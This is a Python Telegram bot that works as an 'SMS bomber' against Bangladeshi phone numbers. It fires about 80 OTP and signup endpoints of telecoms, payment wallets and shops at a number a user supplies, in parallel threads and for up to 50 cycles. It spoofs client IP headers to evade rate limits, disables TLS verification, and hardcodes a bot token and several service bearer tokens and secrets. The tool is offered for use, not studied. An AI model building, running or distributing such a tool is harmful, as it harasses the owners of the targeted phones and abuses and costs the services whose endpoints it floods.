#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import random
import re
import threading
import time
import urllib.parse
import requests
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8996974609:AAFb7QWwPUARvhNrieYglBrvXFtBwZ9gNv8"  # @BotFather theke token set koro
ADMIN_ID = 0  # Optional: admin telegram ID

# ==================== USER AGENTS ====================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
]

# ==================== API LIST (BD Services) ====================
def build_api_list(number):
    """Return list of API request dicts with {{number}} replaced"""
    apis = [
        {'url': 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', 'method': 'POST', 'data': json.dumps({'full_name': 'BILLAVAI', 'company_name': 'HARDBOMBER', 'email_address': 'pro@bomb.bd', 'phone_number': number})},
        {'url': 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web', 'method': 'POST', 'data': json.dumps({'mobile_no': number})},
        {'url': 'https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', 'method': 'POST', 'data': json.dumps({'data': {'country_calling_code': '88', 'contact_no': number, 'headers': {'PlatForm': 'Web'}}})},
        {'url': 'https://api-gateway.sundarbancourierltd.com/graphql', 'method': 'POST', 'data': json.dumps({'operationName': 'CreateAccessToken', 'variables': {'accessTokenFilter': {'userName': number}}, 'query': 'mutation{createAccessToken(accessTokenFilter:{userName:"' + number + '"}){message}}'})},
        {'url': 'https://api.apex4u.com/api/auth/login', 'method': 'POST', 'data': json.dumps({'phoneNumber': number})},
        {'url': 'https://webapi.robi.com.bd/v1/send-otp', 'method': 'POST', 'data': json.dumps({'phone_number': number, 'type': 'doorstep'}), 'headers': {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiJ9.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc'}},
        {'url': f'https://web-api.banglalink.net/api/v1/user/number/validation/{number}', 'method': 'GET'},
        {'url': 'https://web-api.banglalink.net/api/v1/user/otp-login/request', 'method': 'POST', 'data': json.dumps({'mobile': number})},
        {'url': 'https://webloginda.grameenphone.com/backend/api/v1/otp', 'method': 'POST', 'data': urllib.parse.urlencode({'msisdn': number})},
        {'url': 'https://webapi.robi.com.bd/v1/send-otp', 'method': 'POST', 'data': json.dumps({'phone_number': number, 'type': 'my_offer'})},
        {'url': 'https://da-api.robi.com.bd/da-nll/otp/send', 'method': 'POST', 'data': json.dumps({'msisdn': number})},
        {'url': 'https://webapi.robi.com.bd/v1/chat/send-otp', 'method': 'POST', 'data': json.dumps({'phone_number': number, 'name': 'BILLAVAI', 'type': 'video-chat'})},
        {'url': 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'method': 'POST', 'data': json.dumps({'phoneNumber': number})},
        {'url': 'https://fundesh.com.bd/api/auth/generateOTP', 'method': 'POST', 'data': json.dumps({'msisdn': number})},
        {'url': f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}', 'method': 'GET'},
        {'url': 'https://api.motionview.com.bd/api/send-otp-phone-signup', 'method': 'POST', 'data': json.dumps({'phone': number})},
        {'url': 'https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web', 'method': 'POST', 'data': json.dumps({'number': f'+88{number}'})},
        {'url': 'https://user-api.jslglobal.co:444/v2/send-otp', 'method': 'POST', 'data': json.dumps({'phone': f'+88{number}', 'jatri_token': 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'})},
        {'url': f'https://chinaonlinebd.com/api/login/getOtp?phone={number}', 'method': 'GET', 'headers': {'token': '45601f3d391886fcec5f5a3f26780f21'}},
        {'url': 'https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web', 'method': 'POST', 'data': json.dumps({'number': f'+88{number}'})},
        {'url': 'https://api.shikho.com/auth/v2/send/sms', 'method': 'POST', 'data': json.dumps({'phone': number, 'type': 'student', 'auth_type': 'signup'})},
        {'url': 'https://api.redx.com.bd/v1/user/signup', 'method': 'POST', 'data': json.dumps({'name': 'Attack', 'phoneNumber': number, 'service': 'redx'})},
        {'url': f'https://www.bioscopelive.com/en/login/send-otp?phone=88{number}&operator=bd-otp', 'method': 'GET'},
        {'url': 'https://applink.com.bd/appstore-v4-server/login/otp/request', 'method': 'POST', 'data': json.dumps({'msisdn': f'88{number}'})},
        {'url': 'https://chokrojan.com/api/v1/passenger/login/mobile', 'method': 'POST', 'data': json.dumps({'mobile_number': number})},
        {'url': 'https://core.easy.com.bd/api/v1/forgot-password-otp', 'method': 'POST', 'data': json.dumps({'device_key': '2ea97d276a980993308116baa292cec9', 'mobile': number})},
        {'url': 'https://waltonplaza.com.bd/api/auth/otp/create', 'method': 'POST', 'data': json.dumps({'auth': {'countryCode': '880', 'deviceUuid': 'ee757830-f639-12f0-9f4d-2f972746fhg', 'phone': number}, 'captchaToken': 'recapcha'})},
        {'url': 'https://api.chardike.com/api/otp/send', 'method': 'POST', 'data': json.dumps({'phone': number, 'otp_type': 'login'})},
        {'url': 'https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json', 'method': 'POST', 'data': json.dumps({'phoneNbr': number, 'OTPType': 1.0, 'userName': '', 'email': ''})},
        {'url': 'https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send', 'method': 'POST', 'data': json.dumps({'phone': number})},
        {'url': 'https://gateway.otithee.com/api/v1/generate-otp', 'method': 'POST', 'data': json.dumps({'request_type': 'registration', 'mobile_number': number})},
        {'url': 'https://developer.quizgiri.xyz/api/v2.0/send-otp', 'method': 'POST', 'data': json.dumps({'country_code': '+88', 'phone': number})},
        {'url': 'https://new.mojaru.com/api/student/login', 'method': 'POST', 'data': json.dumps({'mobile_or_email': number})},
        {'url': 'https://appcity.grameenphone.com/proxy/v2/user/session/get-otp', 'method': 'POST', 'data': json.dumps({'mobileNumber': number})},
        {'url': 'https://api.garibookadmin.com/api/v3/user/login', 'method': 'POST', 'data': json.dumps({'recaptcha_token': 'garibookcaptcha', 'mobile': number, 'channel': 'web'})},
        {'url': 'https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web', 'method': 'POST', 'data': json.dumps({'number': f'+88{number}'})},
        {'url': f'https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={number}', 'method': 'GET'},
        {'url': 'https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/', 'method': 'POST', 'data': json.dumps({'wallet_number': number, 'geo_location': {'lat': 23.89, 'long': 89.13}, 'referral': '', 'firebase_token': 'dummy', 'device_uuid': 'c65m117a8cbf5b1851b29f8b', 'mno': 'Robi'})},
        {'url': 'https://bb-api.bohubrihi.com/public/activity/otp', 'method': 'POST', 'data': json.dumps({'phone': number, 'intent': 'login'})},
        {'url': 'https://backend.timezonebd.com/api/v1/user/otp-login', 'method': 'POST', 'data': json.dumps({'phone': number})},
        {'url': 'https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', 'method': 'POST', 'data': json.dumps({'phone': number, 'language': 'en', 'email': ''})},
        {'url': 'https://api.shikho.com/public/activity/otp', 'method': 'POST', 'data': json.dumps({'phone': number, 'intent': 'ap-discount-request'})},
        {'url': 'https://edgecoursebd.com/register', 'method': 'POST', 'data': json.dumps([{'phone': number}])},
        {'url': 'https://api.ostad.app/api/v2/user/with-otp', 'method': 'POST', 'data': json.dumps({'msisdn': number})},
        {'url': 'https://www.ieducationbd.com/api/account/check_user', 'method': 'POST', 'data': json.dumps({'mobile': number})},
        {'url': f'https://app.hishabee.business/api/V2/otp/send?mobile_number={number}', 'method': 'GET'},
        {'url': 'https://rootsedulive.com/api/auth/register', 'method': 'POST', 'data': json.dumps({'name': 'BILLAVAI', 'phone': f'88{number}', 'email': f'temp{number}@bomb.bd', 'password': 'Secure@2025', 'confirmPassword': 'Secure@2025'})},
        {'url': 'https://rootsedulive.com/api/auth/forget-password', 'method': 'POST', 'data': json.dumps({'phoneOrEmail': f'88{number}'})},
        {'url': 'https://mithaibd.com/api/login/', 'method': 'POST', 'data': json.dumps({'company_id': '2', 'phone': number, 'email': f'attack{number}@mail.com', 'password1': 'pass123', 'otp_verify': False})},
        {'url': 'https://api.englishmojabd.com/api/v1/auth/login', 'method': 'POST', 'data': json.dumps({'phone': f'+88{number}'})},
        {'url': 'https://moveon.com.bd/api/v1/customer/auth/phone/request-otp', 'method': 'POST', 'data': json.dumps({'phone': number})},
        {'url': 'https://api.osudpotro.com/api/v1/users/send_otp', 'method': 'POST', 'data': json.dumps({'mobile': f'+88-{number}', 'deviceToken': 'web', 'language': 'bn', 'os': 'web'})},
        {'url': f'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{number}/', 'method': 'GET'},
        {'url': 'https://auth.qcoom.com/api/v1/otp/send', 'method': 'POST', 'data': json.dumps({'mobileNumber': f'+88{number}'})},
        {'url': 'https://reseller.circle.com.bd/api/v2/auth/signup', 'method': 'POST', 'data': json.dumps({'name': f'+88{number}', 'email_or_phone': f'+88{number}', 'password': '123456', 'password_confirmation': '123456', 'register_by': 'phone'})},
        {'url': 'https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0', 'method': 'POST', 'data': json.dumps({'phone': number}), 'headers': {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s'}},
        {'url': 'https://api.toybox.live/bdapps_handler.php', 'method': 'POST', 'data': urllib.parse.urlencode({'Operation': 'CreateSubscription', 'MobileNumber': f'88{number}', 'PackageID': 100, 'Secret': 'HJKX71%UHYH'})},
        {'url': f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{number}', 'method': 'GET', 'headers': {'sourcePlatform': 'web', 'client': '2'}},
        {'url': 'https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp', 'method': 'POST', 'data': json.dumps({'deviceId': 'prodevice', 'operator': 'Gp', 'walletNumber': number})},
        {'url': 'https://webapi.robi.com.bd/v1/send-otp', 'method': 'POST', 'data': json.dumps({'phone_number': number, 'type': 'internet_pack'})},
        {'url': 'https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', 'method': 'POST', 'data': json.dumps({'phone': number, 'email': 'pro@bomber.com', 'language': 'bn'})},
        {'url': f'https://api.dmoney.com.bd/api/v1/otp/send?msisdn={number}', 'method': 'GET'},
        {'url': 'https://api.nagad.com.bd/otp/send', 'method': 'POST', 'data': json.dumps({'mobileNumber': number, 'service': 'login'})},
        {'url': 'https://api.surecash.com.bd/v2/otp/generate', 'method': 'POST', 'data': json.dumps({'msisdn': number})},
        {'url': 'https://api.rocket.com.bd/merchant/otp', 'method': 'POST', 'data': json.dumps({'account': number})},
        {'url': 'https://api.bkash.com.bd/otp/request', 'method': 'POST', 'data': json.dumps({'phone': number, 'type': 'registration'})},
        {'url': 'https://api.foodpanda.com.bd/v1/auth/otp', 'method': 'POST', 'data': json.dumps({'phone': f'+88{number}'})},
        {'url': 'https://api.pathao.com/v2/auth/otp', 'method': 'POST', 'data': json.dumps({'phone': number})},
        {'url': 'https://api.daraz.com.bd/auth/otp', 'method': 'POST', 'data': json.dumps({'mobile': number})},
        {'url': 'https://api.priyoshop.com/v1/otp/send', 'method': 'POST', 'data': json.dumps({'phone': number})},
        {'url': f'https://ajkerdeal.com/api/v1/otp?phone={number}', 'method': 'GET'},
        {'url': 'https://api.evaly.com.bd/auth/otp', 'method': 'POST', 'data': json.dumps({'phone': number})},
        {'url': 'https://api.chaldal.com/v1/auth/otp', 'method': 'POST', 'data': json.dumps({'phone': number})},
        {'url': 'https://api.shurjopay.com.bd/otp/send', 'method': 'POST', 'data': json.dumps({'phone': number})},
        {'url': 'https://sslwireless.com/api/otp', 'method': 'POST', 'data': json.dumps({'msisdn': number})},
        {'url': 'https://api.robi.com.bd/v1/send-otp', 'method': 'POST', 'data': json.dumps({'phone_number': number, 'type': 'voice'})},
        {'url': f'https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{number}', 'method': 'GET'},
        {'url': 'https://selfcare.banglalink.net/api/v1/otp', 'method': 'POST', 'data': json.dumps({'msisdn': number})},
        {'url': 'https://teletalk.com.bd/api/otp/send', 'method': 'POST', 'data': json.dumps({'number': number})},
    ]
    return apis


# ==================== BOMBER ENGINE ====================
class SMSBomber:
    def __init__(self):
        self.session = requests.Session()
        self.running = False
        self.stats = {'success': 0, 'failed': 0, 'total': 0}

    def random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

    def get_headers(self, extra_headers=None):
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'X-Forwarded-For': self.random_ip(),
            'X-Real-IP': self.random_ip(),
            'Client-IP': self.random_ip(),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        if extra_headers:
            headers.update(extra_headers)
        return headers

    def send_request(self, api):
        """Send a single request"""
        try:
            url = api['url']
            method = api.get('method', 'GET')
            data = api.get('data', None)
            extra_headers = api.get('headers', {})

            headers = self.get_headers(extra_headers)

            # Set content-type based on data format
            if data:
                try:
                    json.loads(data)
                    headers['Content-Type'] = 'application/json'
                except:
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'

            if method == 'POST':
                resp = self.session.post(url, data=data, headers=headers, timeout=8, verify=False)
            else:
                resp = self.session.get(url, headers=headers, timeout=8, verify=False)

            return 200 <= resp.status_code < 300
        except:
            return False

    def attack(self, number, cycles, progress_callback=None):
        """Run attack with multiple cycles"""
        self.running = True
        self.stats = {'success': 0, 'failed': 0, 'total': 0}

        for cycle in range(1, cycles + 1):
            if not self.running:
                break

            apis = build_api_list(number)

            # Send all APIs in parallel using threads
            threads = []
            results = [None] * len(apis)

            def worker(idx, api):
                results[idx] = self.send_request(api)

            for i, api in enumerate(apis):
                t = threading.Thread(target=worker, args=(i, api))
                threads.append(t)
                t.start()

            # Wait for all threads to complete
            for t in threads:
                t.join()

            # Count results
            cycle_success = sum(1 for r in results if r)
            cycle_failed = sum(1 for r in results if r is False)

            self.stats['success'] += cycle_success
            self.stats['failed'] += cycle_failed
            self.stats['total'] += len(apis)

            if progress_callback:
                progress_callback(cycle, cycles, cycle_success, cycle_failed)

            # Small delay between cycles to avoid rate limiting
            time.sleep(0.5)

        self.running = False
        return self.stats

    def stop(self):
        self.running = False


# ==================== TELEGRAM BOT HANDLERS ====================
bomber = SMSBomber()
active_jobs = {}  # chat_id -> status


def start(update: Update, context: CallbackContext):
    msg = (
        "🔥 *SMS BOMBER BOT ACTIVE* 🔥\n\n"
        "Commands:\n"
        "`/bomb 017XXXXXXX [cycles]` — Attack a number\n"
        "`/stop` — Stop current attack\n"
        "`/status` — Check attack status\n\n"
        "*Examples:*\n"
        "`/bomb 01712345678` — 1 cycle (default)\n"
        "`/bomb 01712345678 5` — 5 cycles\n\n"
        "⚠️ *Only Bangladesh numbers (11 digits)*"
    )
    update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)


def bomb(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if len(args) < 1:
        update.message.reply_text("❌ Use: `/bomb 017XXXXXXX [cycles]`", parse_mode=ParseMode.MARKDOWN)
        return

    number = re.sub(r'[^0-9]', '', args[0])
    if len(number) != 11:
        update.message.reply_text("❌ Invalid number! Must be 11 digits (e.g., 01712345678)")
        return

    cycles = 1
    if len(args) >= 2:
        try:
            cycles = int(args[1])
            if cycles < 1:
                cycles = 1
            if cycles > 50:
                cycles = 50
        except:
            cycles = 1

    if chat_id in active_jobs and active_jobs[chat_id].get('running'):
        update.message.reply_text("⚠️ Already an attack running! Use /stop first or wait.")
        return

    update.message.reply_text(
        f"⚡ *Attack Started!*\n"
        f"Target: `{number}`\n"
        f"Cycles: `{cycles}`\n"
        f"APIs/Cycle: `~70`\n"
        f"Total Requests: `~{cycles * 70}`\n\n"
        f"_Please wait..._",
        parse_mode=ParseMode.MARKDOWN
    )

    active_jobs[chat_id] = {'running': True, 'number': number, 'cycles': cycles}

    def progress_callback(cycle, total_cycles, cycle_ok, cycle_fail):
        try:
            context.bot.send_message(
                chat_id,
                f"📊 *Cycle {cycle}/{total_cycles}*\n"
                f"✅ Success: `{cycle_ok}` | ❌ Failed: `{cycle_fail}`",
                parse_mode=ParseMode.MARKDOWN
            )
        except:
            pass

    def run_attack():
        stats = bomber.attack(number, cycles, progress_callback)
        active_jobs[chat_id] = {'running': False, 'stats': stats}

        # Calculate percentage
        total = stats['total']
        success = stats['success']
        failed = stats['failed']
        pct = (success / total * 100) if total > 0 else 0

        context.bot.send_message(
            chat_id,
            f"✅ *Attack Complete!*\n\n"
            f"📱 Target: `{number}`\n"
            f"🔄 Cycles: `{cycles}`\n"
            f"📊 Total Requests: `{total}`\n"
            f"✅ Success: `{success}` ({pct:.1f}%)\n"
            f"❌ Failed: `{failed}`\n\n"
            f"🔥 *Bombing Done!*",
            parse_mode=ParseMode.MARKDOWN
        )

    threading.Thread(target=run_attack, daemon=True).start()


def stop_attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    bomber.stop()
    active_jobs[chat_id] = {'running': False}
    update.message.reply_text("🛑 Attack stopped by user.")


def status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id in active_jobs:
        job = active_jobs[chat_id]
        if job.get('running'):
            update.message.reply_text("⚡ Attack is currently *running*...", parse_mode=ParseMode.MARKDOWN)
        else:
            stats = job.get('stats', {})
            if stats:
                update.message.reply_text(
                    f"📊 *Last Attack Stats:*\n"
                    f"Total: `{stats.get('total', 0)}`\n"
                    f"✅ Success: `{stats.get('success', 0)}`\n"
                    f"❌ Failed: `{stats.get('failed', 0)}`",
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text("No attack history.")
    else:
        update.message.reply_text("No attack history. Use `/bomb` to start!", parse_mode=ParseMode.MARKDOWN)


def unknown(update: Update, context: CallbackContext):
    update.message.reply_text("Unknown command. Use /start for help.")


# ==================== MAIN ====================
def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: BOT_TOKEN not set! Edit the script and add your bot token.")
        print("   Get token from @BotFather on Telegram.")
        return

    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("bomb", bomb))
    dp.add_handler(CommandHandler("stop", stop_attack))
    dp.add_handler(CommandHandler("status", status))
    dp.add_handler(MessageHandler(Filters.command, unknown))

    print("✅ SMS Bomber Bot Started!")
    print("   Press Ctrl+C to stop.")

    updater.start_polling()
    updater.idle()


if __name__ == "__main__":
    main()
